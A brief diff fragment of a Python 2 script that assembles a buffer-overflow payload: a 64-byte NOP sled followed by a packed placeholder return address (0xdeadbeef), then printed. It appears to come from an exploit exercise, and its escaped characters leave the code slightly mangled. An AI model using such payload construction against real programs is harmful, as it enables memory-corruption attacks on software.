@@ -76,5 +76,7 @@ import struct
 
 nosled = "\x90"\*64
 
-target = struct.
+target = struct.pack\("I",0xdeadbeef\)
+
+print nosled+target
 
